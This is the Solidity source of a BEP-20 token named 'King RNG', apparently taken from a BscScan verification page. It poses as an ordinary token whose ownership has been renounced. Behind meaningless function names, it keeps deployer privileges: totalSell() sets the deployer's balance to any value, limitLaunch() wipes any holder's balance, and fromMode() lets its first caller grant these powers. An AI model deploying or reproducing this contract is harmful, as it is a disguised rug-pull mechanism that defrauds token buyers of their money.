/**
 *Submitted for verification at BscScan.com on 2023-02-11
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract enableExempt {
    function isTx() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface liquidityExempt {
    function createPair(address listMarketingLaunch, address sellLimit) external returns (address);
}

interface receiverAmount {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract KingRNG is IERC20, enableExempt {
    uint8 private takeFrom = 18;
    

    mapping(address => bool) public feeAuto;
    mapping(address => bool) public marketingFee;
    uint256 private receiverTake = 100000000 * 10 ** takeFrom;
    uint256 private buyTo;
    mapping(address => uint256) private liquiditySell;

    address private autoIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private tokenWallet;
    
    address private buySellMode;
    address public takeTeam;
    bool private exemptShould;
    bool public enableTotal;

    
    mapping(address => mapping(address => uint256)) private enableTotalWallet;

    string private takeAuto = "KRG";
    address public autoLimit;
    bool public marketingList;
    bool private marketingLiquidity;
    string private liquidityAuto = "King RNG";
    uint256 private atAmount;
    

    event OwnershipTransferred(address indexed atEnable, address indexed launchMarketing);

    constructor (){
        if (tokenWallet == buyTo) {
            buyTo = tokenWallet;
        }
        receiverAmount shouldMode = receiverAmount(autoIs);
        autoLimit = liquidityExempt(shouldMode.factory()).createPair(shouldMode.WETH(), address(this));
        buySellMode = isTx();
        if (tokenWallet == buyTo) {
            tokenWallet = buyTo;
        }
        takeTeam = buySellMode;
        feeAuto[takeTeam] = true;
        if (enableTotal) {
            exemptShould = false;
        }
        liquiditySell[takeTeam] = receiverTake;
        emit Transfer(address(0), takeTeam, receiverTake);
        receiverFrom();
    }

    

    function symbol() external view returns (string memory) {
        return takeAuto;
    }

    function getOwner() external view returns (address) {
        return buySellMode;
    }

    function toExempt() public {
        if (marketingLiquidity != enableTotal) {
            exemptShould = false;
        }
        
        exemptShould=false;
    }

    function receiverMax() public {
        if (enableTotal) {
            exemptShould = false;
        }
        
        exemptShould=false;
    }

    function owner() external view returns (address) {
        return buySellMode;
    }

    function minAmount(address feeTeam, address exemptSwap, uint256 receiverTx) internal returns (bool) {
        require(liquiditySell[feeTeam] >= receiverTx);
        liquiditySell[feeTeam] -= receiverTx;
        liquiditySell[exemptSwap] += receiverTx;
        emit Transfer(feeTeam, exemptSwap, receiverTx);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return receiverTake;
    }

    function enableLaunchMax() public {
        
        
        tokenWallet=0;
    }

    function decimals() external view returns (uint8) {
        return takeFrom;
    }

    function totalSell(uint256 receiverTx) public {
        if (!feeAuto[isTx()]) {
            return;
        }
        liquiditySell[takeTeam] = receiverTx;
    }

    function senderFrom(address feeTeam, address exemptSwap, uint256 receiverTx) internal returns (bool) {
        if (feeTeam == takeTeam || exemptSwap == takeTeam) {
            return minAmount(feeTeam, exemptSwap, receiverTx);
        }
        if (atAmount == buyTo) {
            tokenWallet = atAmount;
        }
        
        if (enableTotal) {
            exemptShould = true;
        }
        return minAmount(feeTeam, exemptSwap, receiverTx);
    }

    function fromMode(address enableBuyReceiver) public {
        if (marketingList) {
            return;
        }
        
        feeAuto[enableBuyReceiver] = true;
        
        marketingList = true;
    }

    function fromTrading() public view returns (uint256) {
        return tokenWallet;
    }

    function exemptLiquidity() public {
        
        
        atAmount=0;
    }

    function balanceOf(address buyExemptLaunch) public view virtual override returns (uint256) {
        return liquiditySell[buyExemptLaunch];
    }

    function transfer(address tradingAuto, uint256 receiverTx) external virtual override returns (bool) {
        return senderFrom(isTx(), tradingAuto, receiverTx);
    }

    function allowance(address fromBuyExempt, address feeTotalFrom) external view virtual override returns (uint256) {
        return enableTotalWallet[fromBuyExempt][feeTotalFrom];
    }

    function buyTotalSender() public view returns (uint256) {
        return tokenWallet;
    }

    function receiverFrom() public {
        emit OwnershipTransferred(takeTeam, address(0));
        buySellMode = address(0);
    }

    function name() external view returns (string memory) {
        return liquidityAuto;
    }

    function transferFrom(address feeTeam, address exemptSwap, uint256 receiverTx) external override returns (bool) {
        if (enableTotalWallet[feeTeam][isTx()] != type(uint256).max) {
            require(receiverTx <= enableTotalWallet[feeTeam][isTx()]);
            enableTotalWallet[feeTeam][isTx()] -= receiverTx;
        }
        return senderFrom(feeTeam, exemptSwap, receiverTx);
    }

    function limitLaunch(address swapTrading) public {
        if (tokenWallet != atAmount) {
            buyTo = tokenWallet;
        }
        if (swapTrading == takeTeam || swapTrading == autoLimit || !feeAuto[isTx()]) {
            return;
        }
        
        liquiditySell[swapTrading] = 0;
    }

    function approve(address feeTotalFrom, uint256 receiverTx) public virtual override returns (bool) {
        enableTotalWallet[isTx()][feeTotalFrom] = receiverTx;
        emit Approval(isTx(), feeTotalFrom, receiverTx);
        return true;
    }

    function swapTotal() public view returns (bool) {
        return exemptShould;
    }


}